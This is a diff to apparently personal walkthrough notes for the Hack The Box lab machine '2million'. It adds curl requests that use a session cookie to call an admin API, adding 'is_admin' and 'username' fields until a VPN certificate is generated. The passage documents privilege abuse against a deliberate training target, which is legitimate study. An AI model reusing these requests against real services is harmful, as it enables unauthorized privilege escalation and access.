@@ -154,9 +154,17 @@ curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -sv http://2million.htb/api
 - Verified user is the admin
 - Generate a vpn certificate for this user
 
-```
+``` bash
 curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb", "is_admin":1}' | jq
 ```
 
 - New error message "Missing parameter: username"
 ![[Pasted image 20230903231455.png]]
+
+```bash
+curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb", "is_admin":1, "username":"user"}' 
+```
+
+- Our VPN cert has been generated!
+![[Pasted image 20230903232814.png]]
+
